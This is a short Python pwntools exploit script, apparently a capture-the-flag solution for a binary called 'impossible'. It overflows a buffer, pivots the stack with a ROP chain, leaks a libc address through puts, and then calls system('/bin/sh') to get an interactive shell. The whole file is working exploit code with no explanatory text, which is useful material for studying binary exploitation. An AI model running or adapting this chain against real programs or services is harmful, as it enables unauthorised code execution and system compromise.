#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

printf = 0x4005c0
read = 0x4005d0
puts = 0x4005b0

pop_rdi = 0x400873
pop_rsi_r15 = 0x400871
leave_ret = 0x40080d

writehere = 0x601a00

libc = ELF('./libc-2.27.so')
p = process('./impossible')
# p = remote('eductf.zoolab.org', 10105)

p.sendline(str(0x80000000))

rop = flat(
    pop_rdi,
    0x600ff0,
    puts,
    pop_rdi,
    0,
    pop_rsi_r15,
    writehere,
    0,
    read,
    leave_ret)
payload = b'a'*0x100 + p64(writehere - 8) + rop

p.sendlineafter(':)\n',payload)
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x21ab0
print('libc: {:#x}'.format(libc.address))

rop = flat(
        pop_rdi,
        next(libc.search(b'/bin/sh\0')),
        libc.symbols['system'])
sleep(0.5)
p.sendline(rop)

p.interactive()
